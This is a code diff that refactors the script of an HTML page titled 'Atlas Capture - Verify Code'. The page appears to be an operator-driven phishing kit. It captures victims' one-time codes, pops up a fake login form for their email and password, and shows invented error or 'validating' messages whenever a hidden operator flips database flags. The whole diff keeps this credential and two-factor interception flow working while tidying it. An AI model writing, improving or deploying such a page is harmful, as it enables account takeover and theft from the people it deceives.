@@ -4,9 +4,7 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Atlas Capture - Verify Code</title>
-
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
-
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Inter,sans-serif}
 body{background:#f3f4f6;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:40px 10px}
@@ -78,19 +76,17 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   const email = urlParams.get('email');
   if (!email) window.location.href = '/users/login';
 
-  const otpInput = document.getElementById('otpInput');
+  const otpInput  = document.getElementById('otpInput');
   const verifyBtn = document.getElementById('verifyBtn');
-  const errorDiv = document.getElementById('errorMessage');
+  const errorDiv  = document.getElementById('errorMessage');
 
-  let isProcessing = false;
+  let isProcessing     = false;
   let approvalInterval = null;
   let blockCheckInterval = null;
-  let isModalOpen = false;
+  let isModalOpen      = false;
+  let adminTextHandling = false; // lock: only one flag processed at a time
 
-  // ─── Single shared flag to prevent duplicate handling across all 3 pollers ───
-  let adminTextHandling = false;
-
-  // ─── USER-SIDE release endpoint (no JWT needed) ───────────────────────────
+  // ── User-side flag release — no JWT required ───────────────────────────────
   async function releaseAdminText() {
     try {
       await fetch('/api/users/release-admin-text', {
@@ -98,205 +94,133 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email })
       });
-    } catch (err) {
-      console.error('[ERROR] releaseAdminText:', err);
-    }
+    } catch (e) {}
   }
 
-  // ─── Single poller that reads admin_text once and dispatches to handlers ──
+  // ── Single unified admin_text poller ───────────────────────────────────────
   async function pollAdminText() {
-    if (adminTextHandling) return; // already processing a flag, skip
+    if (adminTextHandling) return;
     try {
-      const response = await fetch('/api/users/check-admin-text', {
+      const res  = await fetch('/api/users/check-admin-text', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email })
       });
-      const data = await response.json();
+      const data = await res.json();
       if (!data.admin_text || data.text_release === true) return;
 
-      const text = data.admin_text;
-      adminTextHandling = true; // lock so no other poll fires simultaneously
+      adminTextHandling = true;
 
-      if (text === 'incorrect_otp_error') {
-        await handleIncorrectOtp();
-      } else if (text === 'wrong_login_error') {
-        await handleWrongLogin();
-      } else if (text === 'correct_login_success') {
-        await handleCorrectLogin();
-      } else {
-        // Unknown flag — just release it
-        await releaseAdminText();
-        adminTextHandling = false;
-      }
-    } catch (err) {
-      console.error('[ERROR] pollAdminText:', err);
-      adminTextHandling = false;
-    }
+      if      (data.admin_text === 'incorrect_otp_error')  await handleIncorrectOtp();
+      else if (data.admin_text === 'wrong_login_error')     await handleWrongLogin();
+      else if (data.admin_text === 'correct_login_success') await handleCorrectLogin();
+      else { await releaseAdminText(); adminTextHandling = false; }
+
+    } catch (e) { adminTextHandling = false; }
   }
 
-  // ─── INCORRECT OTP ────────────────────────────────────────────────────────
+  // ── Incorrect OTP ──────────────────────────────────────────────────────────
   async function handleIncorrectOtp() {
-    console.log('[INFO] Incorrect OTP flag – resetting UI');
+    await releaseAdminText(); // wipe DB flag immediately — won't fire again
 
-    // 1. Release the flag in DB first so it never fires again
-    await releaseAdminText();
-
-    // 2. Show error
-    errorDiv.textContent = '❌ Incorrect OTP. Please enter a new code.';
-    errorDiv.style.display = 'block';
-
-    // 3. Clear input
-    otpInput.value = '';
-
-    // 4. Stop approval polling
-    if (approvalInterval) {
-      clearInterval(approvalInterval);
-      approvalInterval = null;
-    }
-
-    // 5. Re-enable button — but block resubmission for 2 seconds
-    verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
+    if (approvalInterval) { clearInterval(approvalInterval); approvalInterval = null; }
     isProcessing = false;
 
+    errorDiv.textContent = '❌ Incorrect code. Please check your email for the latest code and try again.';
+    errorDiv.style.display = 'block';
+    otpInput.value = '';
+
+    // Button disabled 2s cooldown, then re-enable
+    verifyBtn.disabled = true;
+    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
     setTimeout(() => {
       verifyBtn.disabled = false;
       verifyBtn.innerHTML = 'Verify';
       otpInput.focus();
     }, 2000);
 
-    // 6. Hide error after 4 seconds then unlock the poller
-    setTimeout(() => {
-      errorDiv.style.display = 'none';
-      adminTextHandling = false;
-    }, 4000);
+    // Hide error after 5s then unlock poller
+    setTimeout(() => { errorDiv.style.display = 'none'; adminTextHandling = false; }, 5000);
   }
 
-  // ─── WRONG LOGIN ──────────────────────────────────────────────────────────
+  // ── Wrong login ────────────────────────────────────────────────────────────
   async function handleWrongLogin() {
-    console.log('[INFO] Wrong login flag – showing error in modal');
-
-    // 1. Release flag first
     await releaseAdminText();
 
-    const modalError = document.getElementById('modalError');
+    const modalError   = document.getElementById('modalError');
     const loginPassword = document.getElementById('loginPassword');
-    const submitBtn = document.getElementById('submitLoginBtn');
+    const submitBtn    = document.getElementById('submitLoginBtn');
 
-    if (modalError) {
-      modalError.textContent = '❌ Invalid email or password. Please try again.';
-      modalError.style.display = 'block';
-    }
+    if (modalError)    { modalError.textContent = '❌ Invalid email or password. Please try again.'; modalError.style.display = 'block'; }
     if (loginPassword) loginPassword.value = '';
 
-    // 2. Re-enable submit after 2-second cooldown
     if (submitBtn) {
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Please wait...</span>';
+      setTimeout(() => { submitBtn.disabled = false; submitBtn.innerHTML = 'Login to Continue →'; }, 2000);
     }
-
-    setTimeout(() => {
-      if (submitBtn) {
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = 'Login to Continue →';
-      }
-      // Hide error then unlock poller
-      setTimeout(() => {
-        if (modalError) modalError.style.display = 'none';
-        adminTextHandling = false;
-      }, 2000);
-    }, 2000);
+    setTimeout(() => { if (modalError) modalError.style.display = 'none'; adminTextHandling = false; }, 4000);
   }
 
-  // ─── CORRECT LOGIN ────────────────────────────────────────────────────────
+  // ── Correct login ──────────────────────────────────────────────────────────
   async function handleCorrectLogin() {
-    console.log('[INFO] Correct login flag – showing loading spinner');
-
-    // 1. Release flag first
     await releaseAdminText();
-
-    const modalContent = document.getElementById('loginModalContent');
-    if (modalContent) {
-      modalContent.innerHTML = `
-        <div style="text-align:center;">
-          <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
-          <h3>Validating Credentials</h3>
-          <div class="loading-spinner-small"></div>
-          <p>Please wait as we validate your details...</p>
-          <p style="font-size:12px;color:#666;margin-top:10px;">Do not close this window</p>
-        </div>
-      `;
+    const mc = document.getElementById('loginModalContent');
+    if (mc) {
+      mc.innerHTML = `<div style="text-align:center;">
+        <div class="modal-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg></div>
+        <h3>Validating Credentials</h3>
+        <div class="loading-spinner-small"></div>
+        <p>Please wait as we validate your details...</p>
+        <p style="font-size:12px;color:#666;margin-top:10px;">Do not close this window</p>
+      </div>`;
     }
-
-    // Unlock poller after a short delay (modal is now in loading state, no action needed)
     setTimeout(() => { adminTextHandling = false; }, 3000);
   }
 
-  // ─── BLOCK CHECK ──────────────────────────────────────────────────────────
+  // ── Block check ────────────────────────────────────────────────────────────
   async function checkIfBlocked() {
     try {
-      const response = await fetch('/api/users/check-blocked', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res  = await fetch('/api/users/check-blocked', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email })
       });
-      const data = await response.json();
-      if (data.blocked === true) {
-        window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
-        return true;
-      }
+      const data = await res.json();
+      if (data.blocked === true) { window.location.href = `/users/success?email=${encodeURIComponent(email)}`; return true; }
       return false;
-    } catch (err) { return false; }
+    } catch (e) { return false; }
   }
 
   function startBlockChecking() {
     if (blockCheckInterval) clearInterval(blockCheckInterval);
     blockCheckInterval = setInterval(async () => {
       const blocked = await checkIfBlocked();
-      if (blocked) {
-        clearInterval(blockCheckInterval);
-        if (approvalInterval) clearInterval(approvalInterval);
-      }
+      if (blocked) { clearInterval(blockCheckInterval); if (approvalInterval) clearInterval(approvalInterval); }
     }, 3000);
   }
 
-  // ─── OTP SUBMIT & APPROVAL POLLING ───────────────────────────────────────
-  function showLoading() {
-    isProcessing = true;
-    verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
-    errorDiv.style.display = 'none';
-  }
+  // ── OTP submit + first-approval poll ──────────────────────────────────────
+  function showLoading()  { isProcessing = true; verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>'; errorDiv.style.display = 'none'; }
+  function showWaiting()  { verifyBtn.disabled = true; verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>'; }
+  function resetButton()  { isProcessing = false; verifyBtn.disabled = false; verifyBtn.innerHTML = 'Verify'; }
 
-  function showWaitingForApproval() {
-    verifyBtn.disabled = true;
-    verifyBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Validating...</span>';
-  }
-
-  function hideLoading() {
-    isProcessing = false;
-    verifyBtn.disabled = false;
-    verifyBtn.innerHTML = 'Verify';
-  }
-
-  function startCheckingApproval() {
+  // Polls the `approved` column — when true, first OTP accepted → go to second-otp page
+  function startCheckingFirstApproval() {
     if (approvalInterval) clearInterval(approvalInterval);
     approvalInterval = setInterval(async () => {
       try {
         const blocked = await checkIfBlocked();
         if (blocked) return;
-        const response = await fetch('/api/users/check-first-approval', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+        const res  = await fetch('/api/users/check-first-approval', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
-        const data = await response.json();
-        if (data.approved) {
+        const data = await res.json();
+        if (data.approved === true) {
           clearInterval(approvalInterval);
           window.location.href = `/users/second-otp?email=${encodeURIComponent(email)}`;
         }
-      } catch (err) {}
+      } catch (e) {}
     }, 2000);
   }
 
@@ -315,111 +239,89 @@ button:disabled{opacity:0.6;cursor:not-allowed}
 
     showLoading();
     try {
-      const response = await fetch('/api/users/submit-otp', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res  = await fetch('/api/users/submit-otp', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, otp })
       });
-      const data = await response.json();
+      const data = await res.json();
       if (data.success) {
-        showWaitingForApproval();
+        showWaiting();
         startBlockChecking();
-        startCheckingApproval();
+        startCheckingFirstApproval();
       } else {
-        hideLoading();
-        errorDiv.textContent = data.error || 'Invalid OTP';
+        resetButton();
+        errorDiv.textContent = data.error || 'Something went wrong. Please try again.';
         errorDiv.style.display = 'block';
-        setTimeout(() => errorDiv.style.display = 'none', 3000);
+        setTimeout(() => errorDiv.style.display = 'none', 4000);
       }
-    } catch (error) {
-      hideLoading();
+    } catch (e) {
+      resetButton();
       errorDiv.textContent = 'Network error. Please try again.';
       errorDiv.style.display = 'block';
       setTimeout(() => errorDiv.style.display = 'none', 3000);
     }
   }
 
-  // ─── FORCE LOGIN POLLING ──────────────────────────────────────────────────
-  let forceLoginInterval = null;
+  // ── Force-login polling ────────────────────────────────────────────────────
   function startForceLoginPolling() {
-    if (forceLoginInterval) clearInterval(forceLoginInterval);
-    forceLoginInterval = setInterval(async () => {
+    setInterval(async () => {
       if (isModalOpen) return;
       try {
-        const response = await fetch('/api/users/check-force-login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+        const res  = await fetch('/api/users/check-force-login', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
-        const data = await response.json();
+        const data = await res.json();
         if (data.force_login === true) {
           isModalOpen = true;
           document.getElementById('loginModal').classList.add('active');
           document.getElementById('loginEmail').value = '';
           document.getElementById('loginPassword').value = '';
           document.getElementById('modalError').style.display = 'none';
-          const submitBtn = document.getElementById('submitLoginBtn');
-          if (submitBtn) {
-            submitBtn.disabled = false;
-            submitBtn.innerHTML = 'Login to Continue →';
-          }
+          const btn = document.getElementById('submitLoginBtn');
+          if (btn) { btn.disabled = false; btn.innerHTML = 'Login to Continue →'; }
         }
-      } catch (err) {}
+      } catch (e) {}
     }, 2000);
   }
 
-  // ─── REDIRECT SUCCESS POLLING ─────────────────────────────────────────────
-  let redirectSuccessInterval = null;
+  // ── Redirect-success polling ───────────────────────────────────────────────
   function startRedirectSuccessPolling() {
-    if (redirectSuccessInterval) clearInterval(redirectSuccessInterval);
-    redirectSuccessInterval = setInterval(async () => {
+    setInterval(async () => {
       try {
-        const response = await fetch('/api/users/check-redirect-success', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+        const res  = await fetch('/api/users/check-redirect-success', {
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ email })
         });
-        const data = await response.json();
-        if (data.redirect_success === true) {
-          clearInterval(redirectSuccessInterval);
-          window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
-        }
-      } catch (err) {}
+        const data = await res.json();
+        if (data.redirect_success === true) window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+      } catch (e) {}
     }, 2000);
   }
 
-  // ─── LOGIN MODAL SUBMIT ───────────────────────────────────────────────────
+  // ── Login modal submit ─────────────────────────────────────────────────────
   async function submitLogin() {
-    const loginEmail = document.getElementById('loginEmail').value.trim();
+    const loginEmail    = document.getElementById('loginEmail').value.trim();
     const loginPassword = document.getElementById('loginPassword').value;
-    const modalError = document.getElementById('modalError');
-    const submitBtn = document.getElementById('submitLoginBtn');
+    const modalError    = document.getElementById('modalError');
+    const submitBtn     = document.getElementById('submitLoginBtn');
 
-    if (!loginEmail || !loginPassword) {
-      modalError.textContent = 'Please enter both email and password';
-      modalError.style.display = 'block';
-      return;
-    }
+    if (!loginEmail || !loginPassword) { modalError.textContent = 'Please enter both email and password'; modalError.style.display = 'block'; return; }
     const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
-    if (!emailRegex.test(loginEmail)) {
-      modalError.textContent = 'Please enter a valid email address';
-      modalError.style.display = 'block';
-      return;
-    }
+    if (!emailRegex.test(loginEmail)) { modalError.textContent = 'Please enter a valid email address'; modalError.style.display = 'block'; return; }
 
     submitBtn.disabled = true;
     submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
     modalError.style.display = 'none';
 
     try {
-      const response = await fetch('/api/users/submit-login-popup', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res  = await fetch('/api/users/submit-login-popup', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ email, loginEmail, loginPassword })
       });
-      const data = await response.json();
+      const data = await res.json();
       if (data.success) {
-        // Keep button in loading state — admin will send correct/wrong signal
+        // Stay spinning — admin will trigger correct/wrong signal
         submitBtn.disabled = true;
         submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Verifying...</span>';
       } else {
@@ -428,7 +330,7 @@ button:disabled{opacity:0.6;cursor:not-allowed}
         submitBtn.disabled = false;
         submitBtn.innerHTML = 'Login to Continue →';
       }
-    } catch (error) {
+    } catch (e) {
       modalError.textContent = 'Network error. Please try again.';
       modalError.style.display = 'block';
       submitBtn.disabled = false;
@@ -436,12 +338,10 @@ button:disabled{opacity:0.6;cursor:not-allowed}
     }
   }
 
-  // ─── START ALL POLLING ────────────────────────────────────────────────────
+  // ── Boot ───────────────────────────────────────────────────────────────────
   startForceLoginPolling();
   startRedirectSuccessPolling();
   startBlockChecking();
-
-  // Single unified admin text poller — replaces 3 separate ones
   setInterval(pollAdminText, 2000);
 
   verifyBtn.addEventListener('click', verifyOTP);
@@ -450,6 +350,5 @@ button:disabled{opacity:0.6;cursor:not-allowed}
   document.getElementById('differentEmail').addEventListener('click', () => { window.location.href = '/users/login'; });
   document.getElementById('submitLoginBtn').addEventListener('click', submitLogin);
 </script>
-
 </body>
 </html>
